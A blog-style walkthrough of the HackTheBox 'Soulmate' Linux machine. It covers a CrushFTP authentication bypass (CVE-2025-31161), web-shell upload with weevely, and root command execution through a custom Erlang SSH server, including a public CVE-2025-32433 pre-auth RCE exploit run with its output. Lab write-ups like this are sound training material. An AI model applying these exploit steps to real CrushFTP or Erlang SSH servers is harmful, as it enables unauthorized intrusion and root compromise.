---
layout: post
title: Soulmate (Linux - Easy)
date: 2026-03-23 20:57 +0100
description: Exploiting an authentication bypass in CrushFTP to gain access to an FTP server, then leveraging a custom SSH server running as root to execute commands and read the root flag.
categories:
- Challenges
- Linux
tags:
- hackthebox
- writeups
- easy
---

![Soulmate HackTheBox Writeup](/assets/img/hackthebox/soulmate/soulmate.png){: width="80" height="80" .right }

## Reconnaissance

Start with an `nmap` scan to identify open ports and services:

```bash
sudo nmap -sS -A <target-ip>
```

This scan reveals several open ports.
- Port 22: SSH
- Port 80: HTTP (Nginx)

When we connect to the web server on port 80, it redirects us to `soulmate.htb`.
Add `soulmate.htb` to `/etc/hosts` so the domain resolves correctly:

```plaintext
<target-ip> soulmate.htb
```

Visiting the website, we see a simple homepage with a link to a login page.

The main website does not expose anything useful at first glance (no injection, upload, LFI, or obvious information disclosure).

So we go back to reconnaissance and look for subdomains.

Using `ffuf` to brute-force subdomains:

```bash
ffuf -u 'http://soulmate.htb/' -H 'Host: FUZZ.soulmate.htb' -w subdomains-top1million-5000.txt -fs 154
```

> To find the argument `-fs 154`, I first ran the command without it to see the size of the responses and then filtered out the common size to focus on potentially interesting results.
{: .prompt-info }

This reveals a subdomain: `ftp.soulmate.htb`.

## Authentication Bypass

Visiting `ftp.soulmate.htb`, we see an FTP server login page using CrushFTP.

I first tried common credentials without success.

Then I searched for known CrushFTP vulnerabilities and found [CVE-2025-31161](https://github.com/Immersive-Labs-Sec/CVE-2025-31161) with a public exploit.

This vulnerability allows an authentication bypass to access the CrushFTP server.

Using the provided Python script to exploit the vulnerability:

```bash
git clone https://github.com/Immersive-Labs-Sec/CVE-2025-31161.git
cd CVE-2025-31161
python3 cve-2025-31161.py --target_host 'ftp.soulmate.htb' --target_user crushadmin --new_user toto --password toto --port 80
```

This creates a new user `toto` with password `toto`.

Now, we can log in to the FTP server using these credentials and we have admin access.

## Remote Code Execution

Exploring the FTP server, we find that we can manage user accounts.

For this RCE, I found two ways to achieve it.

### Method 1: Use user `ben` to upload a web shell

Another user exists: `ben`, with access to the web directory containing the `soulmate.htb` site files.

This user can upload files to the web directory. We can modify Ben's password to access his account.

Go to admin > User Manager > Select User `ben` > Password -> just set a new password > Save.

Now we can log in as `ben`.

Using ben's account, we can upload a web shell to the web directory `webProd`.

We use [weevely](https://github.com/epinna/weevely3) to generate a web shell:

```bash
weevely generate agent.php pass
```

> Here, `pass` is the password to access the web shell.
{: .prompt-info }

Uploading the `agent.php` web shell to the `webProd` directory.

Now, we can access the web shell by using this command:

```bash
weevely http://soulmate.htb/agent.php pass
```

### Method 2: Change our user permissions to access the web directory

In User Manager, we can also change `toto` permissions to access the web directory.

Go to admin > User Manager > Select User `toto` > drag and drop the directory `app` from the Server's Files to the User's Files > Check the box "Upload" > Save.

Now, we can upload a web shell to the web directory `webProd` using our user `toto`.

We use the same method as above to generate and upload the web shell.

## User Privilege Escalation

We now have a web shell on the server, but we are running as `www-data`, so we need to escalate privileges to read the user flag.

First, we enumerate the system to find potential privilege escalation vectors.

Using [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) to automate the enumeration process.

Uploading LinPEAS to the server using our web shell:

```bash
:file_upload /path/to/linpeas.sh /tmp/linpeas.sh
```

Then give execute permissions and run it:

```bash
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

LinPEAS reveals nothing for sure. We need to explore manually.

In the LinPEAS results, we find a process running as `root`: `erlang_login/start.escript`.

Full command:
```bash
/usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local/lib/erlang_login/start.escript
```

This Erlang script starts a custom SSH server.

Inside it, we find a hardcoded password for `ben`, which lets us connect over SSH.

At this point, there is also a shortcut to obtain both user and root flags. We will cover it after the classic path.

## Root Privilege Escalation

To escalate our privileges to root, we can exploit the custom SSH server running as root.

We can check the exposed port `2222` using `nc`:

```bash
nc 127.0.0.1 2222
SSH-2.0-Erlang/5.2.9
```

However, we hit a protocol issue with `nc`, so we use `ssh` instead.

```bash
ssh -p 2222 ben@127.0.0.1
```

Now run `help().` to list available commands.
```erlang
1> help().
...
2> m(). % List available modules
...
os                    /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/os.beam
...
3> m(os).
Module: os
MD5: 594e9e9b7ffbf8b367e6cdc48f1e88e1
Object file: /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/os.beam
Compiler options:  [debug_info,
                    {i,"/buildroot/otp/lib/kernel/src/../include"},
                    warn_missing_doc_function,warn_missing_doc_callback,
                    warn_missing_spec_documented]
Exports: 
cmd/1                         module_info/1
cmd/2                         perf_counter/1
env/0                         perf_counter/0
find_executable/1             putenv/2
find_executable/2             set_signal/2
getenv/0                      system_time/1
getenv/2                      system_time/0
getenv/1                      timestamp/0
getpid/0                      type/0
internal_init_cmd_shell/0     unsetenv/1
module_info/0                 version/0
ok
4> os:cmd("id").
"uid=0(root) gid=0(root) groups=0(root)\n"
```

We find that we have access to the `os` module which allows us to execute system commands as root.

So we can read the root flag directly:

```erlang
5> os:cmd("cat /root/root.txt").
```

## Shortcut to get both flags

When I solved the box, I also used Netcat to identify the Erlang version and searched for exploits. I found [CVE-2025-32433](https://github.com/NiteeshPujari/CVE-2025-32433-PoC), which allows root RCE without needing Ben's password.

While still `www-data`, run this command to get the Erlang version:

```bash
nc 127.0.0.1 2222
SSH-2.0-Erlang/5.2.9
```

Then use the public exploit to get root access directly.

```bash
git clone https://github.com/NiteeshPujari/CVE-2025-32433-PoC.git
cd CVE-2025-32433-PoC
proxychains python3 cve_2025_32433_exploit.py --command 'os:cmd("cat /root/root.txt > /tmp/id_output.txt").'
ProxyChains-3.1 (http://proxychains.sf.net)

   ___ _  _ ___ _  _    ____ ___  ____  ____ _  _ ____
  / __| | | | _ \ | | |  | _ \| _|/ ___|/ ___| | | | __ )
 | (__| |_| | _/ |_| |  | |_) | | | |   | |   | |_| | _ \
  \___|\___/|_| |___/___|  | _ <| | |___| |___| _  | |_) |
                        |_| \_\___|\____|\____|_| |_|____/

      Erlang/OTP SSH Pre-Auth RCE PoC (CVE-2025-32433)
                  For CTF Challenges by Pujari Niteesh
    
Enter target IP address (e.g., 127.0.0.1) [10.10.1.100]: 127.0.0.1
Enter target port (e.g., 2222) [2222]: 
|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:2222-<><>-OK
[*] Connecting to SSH server at 127.0.0.1:2222...
[DEBUG_EXPLOIT] Sending client banner (len: 21): b'SSH-2.0-OpenSSH_8.9\r\n'
[DEBUG_EXPLOIT] Received server banner (len: 22): b'SSH-2.0-Erlang/5.2.9\r\n'
[+] Received banner: SSH-2.0-Erlang/5.2.9
[*] Sending SSH_MSG_KEXINIT...
[DEBUG_EXPLOIT] Sending KEXINIT packet (padded len: 248): 
[*] Sending SSH_MSG_CHANNEL_OPEN...
[DEBUG_EXPLOIT] Sending CHANNEL_OPEN packet (padded len: 40): 000000240b5a0000000773657373696f6e0000000000068000000100000000000000000000000000
[*] Sending SSH_MSG_CHANNEL_REQUEST (pre-auth) with command: 'os:cmd("cat /root/root.txt > /tmp/id_output.txt").'...
[DEBUG_EXPLOIT] Sending CHANNEL_REQUEST packet (padded len: 80): 0000004c076200000000000000046578656301000000326f733a636d642822636174202f726f6f742f726f6f742e747874203e202f746d702f69645f6f75747075742e74787422292e00000000000000
[✓] Exploit sent! If the server is vulnerable, check the target for the result (e.g., /tmp/note.txt).
[DEBUG_EXPLOIT] Received response from target after exploit (len: 1016): 
[+] Received response from target after exploit: 
```

> In this example, I used `proxychains` to run the exploit from my local machine through the VPN. You can also upload the exploit and run it directly on the target (`python3` is installed by default).
{: .prompt-info }

This shortcut allows us to obtain both flags without recovering Ben's password.
